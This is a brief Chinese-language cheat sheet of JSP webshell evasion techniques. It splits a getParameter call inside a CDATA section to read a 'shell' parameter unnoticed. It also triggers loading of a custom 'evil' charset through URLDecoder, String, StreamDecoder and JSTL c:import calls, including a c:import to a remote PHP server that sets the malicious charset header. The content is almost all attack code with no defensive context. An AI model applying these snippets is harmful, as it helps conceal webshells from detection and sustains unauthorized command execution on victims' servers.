# 补充

## CDATA特性

jsp支持xml格式

```jsp
String cmd = request.getPar<![CDATA[ameter]]>("shell");
```

## 与Charsets.forName有关函数

```java
java.net.URLDecoder.decode("aa","evil");
new java.lang.String(new byte[]{66},"evil");
sun.nio.cs.StreamDecoder.forInputStreamReader(new InputStream() {
        @Override
        public int read() throws IOException {
            return 0;
        }
    },null,"evil");
```



### JSTL

1. c:import标签自带设置

```jsp
<c:import  url="http://xxx" charEncoding="evil" >
</c:import>
```



2. 会根据请求内容体返回设置

```jsp
<c:import  url="http://xxx/index.php" >
</c:import>
```

然后php服务器上设置

```php
<?php

header("Content-type: charset=evil");
```

